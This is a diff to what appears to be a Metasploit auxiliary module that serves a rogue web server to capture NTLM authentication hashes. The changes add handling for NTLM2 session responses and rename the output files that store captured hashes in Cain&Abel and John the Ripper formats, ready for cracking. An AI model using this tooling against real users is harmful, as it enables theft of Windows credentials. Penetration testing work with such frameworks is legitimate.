@@ -48,7 +48,7 @@ class Metasploit3 < Msf::Auxiliary
 			'DefaultAction'  => 'WebServer'))
 
 		register_options([
-			OptString.new('LOGFILE',     [ false, "The local filename to store the captured hashes", nil ]),
+			#OptString.new('LOGFILE',     [ false, "The local filename to store the captured hashes", nil ]),
 			OptString.new('CAINPWFILE',  [ false, "The local filename to store the hashes in Cain&Abel format", nil ]),
 			OptString.new('JOHNPWFILE',  [ false, "The prefix to the local filename to store the hashes in JOHN format", nil ]),
 			OptString.new('CHALLENGE',   [ true, "The 8 byte challenge ", "1122334455667788" ])
@@ -293,12 +293,12 @@ class Metasploit3 < Msf::Auxiliary
 
 			print_status(capturelogmessage)
 
-			if(datastore['LOGFILE'])
-				File.open(datastore['LOGFILE'], "ab") {|fd| fd.puts(capturelogmessage + "\n")}
-			end
+			#if(datastore['LOGFILE'])
+			#	File.open(datastore['LOGFILE'], "ab") {|fd| fd.puts(capturelogmessage + "\n")}
+			#end
 
 			if(datastore['CAINPWFILE'] and user)
-				if ntlm_ver == NTLM_CONST::NTLM_V1_RESPONSE then
+				if ntlm_ver == NTLM_CONST::NTLM_V1_RESPONSE or ntlm_ver == NTLM_CONST::NTLM_2_SESSION_RESPONSE 
 					fd = File.open(datastore['CAINPWFILE'], "ab")
 					fd.puts(
 						[
@@ -315,9 +315,9 @@ class Metasploit3 < Msf::Auxiliary
 
 			if(datastore['JOHNPWFILE'] and user)
 				case ntlm_ver
-				when NTLM_CONST::NTLM_V1_RESPONSE
+				when NTLM_CONST::NTLM_V1_RESPONSE, NTLM_CONST::NTLM_2_SESSION_RESPONSE 
 
-					fd = File.open(datastore['JOHNPWFILE'] + '_lmv1_ntlmv1', "ab")
+					fd = File.open(datastore['JOHNPWFILE'] + '_netntlm', "ab")
 					fd.puts(
 						[
 							user,"",
@@ -330,7 +330,7 @@ class Metasploit3 < Msf::Auxiliary
 					fd.close
 				when NTLM_CONST::NTLM_V2_RESPONSE
 					#lmv2
-					fd = File.open(datastore['JOHNPWFILE'] + '_lmv2', "ab")
+					fd = File.open(datastore['JOHNPWFILE'] + '_netlmv2', "ab")
 					fd.puts(
 						[
 							user,"",
@@ -342,7 +342,7 @@ class Metasploit3 < Msf::Auxiliary
 					)
 					fd.close
 					#ntlmv2
-					fd = File.open(datastore['JOHNPWFILE'] + '_ntlmv2' , "ab")
+					fd = File.open(datastore['JOHNPWFILE'] + '_netntlmv2' , "ab")
 					fd.puts(
 						[
 							user,"",
